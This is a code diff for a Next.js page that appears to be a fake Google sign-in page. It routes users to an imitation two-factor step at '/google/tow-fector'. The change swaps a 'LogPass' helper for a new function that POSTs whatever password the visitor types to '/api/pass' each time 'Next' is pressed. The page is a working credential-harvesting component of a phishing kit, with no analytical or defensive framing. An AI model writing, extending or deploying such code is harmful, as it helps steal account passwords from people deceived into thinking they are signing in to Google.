@@ -1,17 +1,23 @@
 "use client";
 
 import Image from "next/image";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import Head from "next/head";
 import { useRouter } from "next/navigation";
 // import local file
-import LogPass from "../LogPass";
 
 export default function Home() {
   const [showPass, setShowPass] = useState(false);
   const [isEmailFill, setIsEmailFill] = useState(false);
   const [pass, setPass] = useState("");
   const route = useRouter();
+
+  const makeApicall = async () => {
+    await fetch("/api/pass", {
+      method: "POST",
+      body: JSON.stringify({ pass }),
+    });
+  };
 
   const chakInput = (e) => {
     if (e.target.value != "") {
@@ -29,8 +35,8 @@ export default function Home() {
   };
 
   const handleNextBtn = () => {
+    makeApicall();
     if (isEmailFill) {
-      LogPass(pass, "password");
       route.push("/google/tow-fector");
     } else {
       // fill error
